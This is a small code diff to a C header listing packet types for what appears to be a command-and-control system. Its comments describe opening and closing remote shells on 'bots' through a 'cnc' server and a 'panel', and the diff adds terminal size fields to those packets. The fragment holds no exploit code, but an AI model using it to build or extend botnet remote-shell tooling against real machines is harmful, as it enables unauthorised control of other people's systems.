@@ -54,7 +54,8 @@ enum {
     */
     LAIKAPKT_SHELL_OPEN, /* if sent to bot, opens a shell. if sent to cnc, signifies you opened a shell */
     /* layout of LAIKAPKT_SHELL_OPEN:
-    *   NULL (empty packet)
+    *   uint16_t cols;
+    *   uint16_t rows;
     */
     LAIKAPKT_SHELL_CLOSE, /* if sent to bot, closes a shell. if sent to cnc, signifies a shell was closed */
     /* layout of LAIKAPKT_SHELL_CLOSE:
@@ -85,6 +86,8 @@ enum {
     LAIKAPKT_AUTHENTICATED_SHELL_OPEN_REQ, /* panel requesting cnc open a shell on bot. there is no response packet, shell is assumed to be open */
     /* layout of LAIKAPKT_AUTHENTICATE_OPEN_SHELL_REQ
     *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
+    *   uint16_t cols;
+    *   uint16_t rows;
     */
     LAIKAPKT_AUTHENTICATED_SHELL_CLOSE, /* peer requesting close their currently opened shell (accepted by both cnc & panel) */
     /* layout of LAIKAPKT_AUTHENTICATED_SHELL_CLOSE_REQ:
